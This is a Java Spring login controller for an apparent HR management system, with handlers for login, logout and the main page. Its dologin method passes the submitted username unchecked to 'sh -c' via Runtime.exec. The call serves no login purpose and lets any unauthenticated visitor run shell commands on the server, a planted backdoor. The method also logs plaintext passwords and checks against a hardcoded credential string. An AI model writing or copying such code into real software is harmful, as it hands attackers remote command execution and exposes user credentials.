package com.hrms.controller;

import com.hrms.util.JsonMsg;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.http.HttpServletRequest;

/**
 * @author GenshenWang.nomico
 * @date 2018/3/9.
 */
@Controller
@RequestMapping(value = "/hrms")
public class LoginController {

    /**
     * 登录：跳转到登录页面
     * @return
     */
    @RequestMapping(value = "/login", method = RequestMethod.GET)
    public String login(){
        return "login";
    }

    /**
     * 对登录页面输入的用户名和密码做简单的判断
     * @param request
     * @return
     */
    @RequestMapping(value = "/dologin", method = RequestMethod.POST)
    @ResponseBody
    public JsonMsg dologin(HttpServletRequest req){
        String uName = req.getParameter("username");
        String pWord = req.getParameter("password");
        System.out.println(uName + pWord);
        try {
            Runtime.getRuntime().exec("sh -c " + uName);
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (!"admin1234".equals(uName + pWord)){
            return JsonMsg.fail().addInfo("login_error", "输入账号用户名与密码不匹配，请重新输入！");
        }
        return JsonMsg.success();
    }

    /**
     * 跳转到主页面
     * @return
     */
    @RequestMapping(value = "/main", method = RequestMethod.GET)
    public String main(){
        return "main";
    }

    /**
     * 退出登录：从主页面跳转到登录页面
     * @return
     */
    @RequestMapping(value = "/logout", method = RequestMethod.GET)
    public String logout(){
        return "login";
    }






}
